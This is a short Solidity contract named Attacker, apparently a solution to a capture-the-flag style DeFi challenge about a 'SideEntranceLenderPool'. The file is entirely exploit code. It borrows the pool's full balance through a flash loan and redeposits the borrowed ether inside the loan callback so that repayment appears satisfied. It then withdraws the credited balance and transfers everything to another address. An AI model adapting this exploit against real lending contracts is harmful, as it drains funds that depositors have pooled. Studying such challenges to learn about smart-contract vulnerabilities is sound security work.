// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attacker {
    SideEntranceLenderPool pool;
    address rescue;

    constructor(address _pool, address _rescue) {
        pool = SideEntranceLenderPool(_pool);
        rescue = _rescue;
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(rescue).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
